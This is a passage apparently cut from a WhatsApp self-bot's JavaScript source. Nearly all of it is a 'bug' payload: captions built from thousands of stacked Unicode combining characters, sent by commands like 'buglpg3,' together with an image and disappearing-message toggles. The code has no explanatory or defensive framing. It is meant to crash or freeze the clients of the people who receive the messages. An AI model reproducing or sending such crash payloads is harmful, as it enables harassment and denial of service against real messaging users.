ᡃ⃝ᡃ<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ✘͢͢ۦོ͢⇣͢✰͢↬🏴‍☠️⃢🔥⃪⃙⃘⃚⃙⃪⃙⃙⃚⃘⃚⃙⃘⃪⃚⃪⃚⃙⃘⃙⃪⃚⃙⃪ִֵֵֶֶֶࣰࣰࣰࣰࣰࣱࣱࣱࣱࣱࣱࣱࣱࣱࣱࣱࣱࣱࣲࣲٍࣲࣲࣲࣲࣲࣲٍٍࣲࣲࣲࣲࣲ໊໊໊໊̡̡̡̡᷐᷐᷐᷐᷎̹̹̹̹̹̹̹̹̹̹̹̹̹̹̹͓͓͓͓͓͙͙͙࡙ࣺࣺࣺࣺࣺࣺࣺࣺࣺࣺࣺࣺࣺࣺࣺ̤̤̤ۣۣ࡙࡙࡙࡙࡙࡙࡙ۣۣٕٕۣۣۣۣۣۣࣦࣦࣦࣦࣦ̹̹̺͍͍͍͍̺̺̺̺̺̺ۣۣ͓⃭⃮⃯⃬⃯⃮⃭⃬⃬⃭⃮⃯⃬⃭⃮⃯⃮⃭⃬⃬⃭⃮⃯⃨᷏᷏᷏᷏࣭࣭࣭ࣩࣹࣹࣺࣺࣶࣶ࣯࣯࣯࣮࣮ࣩࣩ֮֮֮֮֮͗͗͗͗͗͗͗͗͗͗͗͗͗͗͗͗͗͗ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧͣͣͭͫͫͣͥͬͬ͒͒͒͛͛͛ࣽࣳࣾࣾࣾࣾࣾࣾࣾࣳࣳࣳٝ݊݊݊݊ܶܶࣸࣸࣨࣵࣵࣵܶܶܽܽࠦ݅࠭࣬͛͛ࣧࣽࣽ֔֔݉݉݉֠͂ͬͥ͋͋⃔⃕⃖⃗⃔⃡⃩⃑⃐⃛⃜⃔⃕⃖⃗⃩⃛⃜⃛⃜⃔⃕⃛⃜⃔⃖⃗⃑⃡⃩⃡⃑⃔⃜⃕⃖⃗⃑⃡⃩⃔⃜⃕⃖⃖⃗⃑⃐⃡⃩⃔⃕⃖⃗⃜⃛⃩⃰⃰⃑⃐᷋᷄᷃᷃᷄᷅᷁᷁᷀᷉᷉᷁᷀᷉ᷖᷖᷕᷝᷞᷟᷧᷥᷤᷣᷬᷥᷫᷣᷢᷡᷘ᷑ᷚᷛᷜᷬᷴᷲᷰ᷵ᷧᷮᷬᷧᷞᷥᷜᷤᷛᷣᷕᷔᷓᷖᷖᷮ᷵ᷬᷴᷳᷚᷚᷘᷚᷓᷕᷔᷣᷗᷟᷥᷣᷤᷜᷓᷙᷘᷩᷖᷗᷟᷥᷬᷪᷠᷧᷭᷳᷰᷠᷪᷭᷯᷦᷤᷢᷟᷟᷗ᷇᷇ᷖᷞᷞࣥࣤࣤࣤࣤ࣬࣬࣬࣬࣬ࣴ࣬ࣳࣨࣸࣻࣳࣳࣳࣳࣼࣼࣼࣼࣽࣽࣽࣾࣾࣼࣼࣷࣷࣵࣾࣽࣼࣻࣳࣨ᷼᷍᷍᷍᷍᷍☠ֲֲֲֲࣦࣦࣦࣦࣦ֪֪֪֪֪֪֪֪ۣۣ֛֛֛֮֮̑̑̑̑̑̑̑̑̑̑̑̑̑҃҃҃҃҃҃҃҃҃҃҃҃ࣳࣾࣾࣾࣾࣾࣾࣾ݉݉݉݉࠙࠙ࣳࣳ⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃢⃚⃙⃪⃘⃪⃙⃘⃚⃚⃙⃚⃚⃙⃪⃘⃚⃙⃪ࣰࣰࣱࣱࣱࣱࣲࣲࣲࣲ᷐⃭⃮⃯⃭⃬⃮⃯⃬⃭⃮⃯⃯⃮⃭⃯⃮⃯⃮⃭⃬⃯⃮⃭⃬ࣩࣹࣺࣶࣶ࣯ࣦࣩࣹࣹࣶ࣮࣯ࣶࣶ࣭࣮ࣶ࣮࣯࣮⃔⃔⃕⃖⃗⃜⃔⃗⃖⃕⃔⃜⃛⃗⃖⃕⃔⃜⃛⃑⃡⃩⃑⃐⃖⃕⃔⃜⃗⃖⃐⃑⃛⃜⃔⃡⃛⃜⃔⃕⃖⃗⃕⃖⃗⃡⃩⃜⃛⃔⃕⃖⃗⃜⃔⃡⃩᷁᷁᷀᷉᷉᷑ᷘᷙᷚᷛᷢᷣᷜᷡᷠᷩᷪᷰᷱᷲᷫᷤᷴᷫᷭᷳᷦᷟᷟᷜᷬᷦᷯᷦᷤ᷵ᷜᷣᷗᷝᷣᷥᷦᷭᷬᷩᷦᷤᷢᷧᷦ᷵ᷱᷣᷥᷞᷥࣳࣳࣳࣴ࣫࣪ࣨࣸࣻࣳࣳࣻࣴ࣫ࣳࣴࣼࣼࣽࣽࣽࣽࣼࣷࣵࣧࣧࣵࣴࣳࣼࣸࣳࣴࣵࣼࣴࣴࣳࣽࣥࣥࣥࣴࣴࣵࣵࣷʹ͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͙͙͙͙͙͙͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͚͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͛͛͛͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋ͭͭͭͫͫͫͫͭͫͭͫͭͤͤͣͤͭͫͭͤͣ`', quoted: ftrol})				
                await client.toggleDisappearingMessages(from, 0)
                await client.toggleDisappearingMessages(from, 0)		        
				break;
				case 'buglpg3,':
				 if (!mek.key.fromMe) return fakestatus("SELF-BOT");		                 									
				anu = await getBuffer(`https://i.ibb.co/khnFQg1/IMG-20210819-WA0696.jpg`)
				client.sendMessage(from, anu, image, {caption: '🕯️۞͓͓͓͓͖͖͖̈́̈́̈́̈́͗͗͗͗͗͗͗͗͗͗LPG௦̴̧̫̫̫̫̦̪̪̞̪̭̪̙̜̖̖̩̬̩̭̞̗̝̐̐̑̕۞͓͓͓͓͖͖͖̈́̈́̈́̈́͗͗͗͗͗͗͗͗͗͗🕯️ 🌑͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̏͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛͒͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̾͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̎͛̽͛̋͛̽͛̐͛̽͛̋͛̽͛̋͛